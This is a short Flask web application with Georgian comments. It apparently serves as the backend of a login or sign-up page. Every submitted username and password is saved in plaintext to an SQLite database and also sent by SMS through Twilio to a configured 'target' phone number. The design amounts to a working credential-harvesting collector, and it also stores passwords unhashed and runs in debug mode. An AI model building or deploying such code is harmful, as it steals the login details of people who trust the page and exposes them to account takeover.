from flask import Flask, render_template, request, redirect
import sqlite3
from twilio.rest import Client
import config

app = Flask(__name__)

# SMS გაგზავნის ფუნქცია
def send_sms(username, password):
    client = Client(config.TWILIO_ACCOUNT_SID, config.TWILIO_AUTH_TOKEN)
    message = client.messages.create(
        body=f"ახალი მომხმარებელი: {username}\nპაროლი: {password}",
        from_=config.TWILIO_PHONE,
        to=config.TARGET_PHONE
    )
    return message.sid

# ბაზის ინიციალიზაცია
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # ჩაწერა ბაზაში
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()
        
        # SMS გაგზავნა
        try:
            send_sms(username, password)
        except Exception as e:
            print(f"SMS შეცდომა: {e}")
        
        return redirect('/success')
    return render_template('index.html')

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)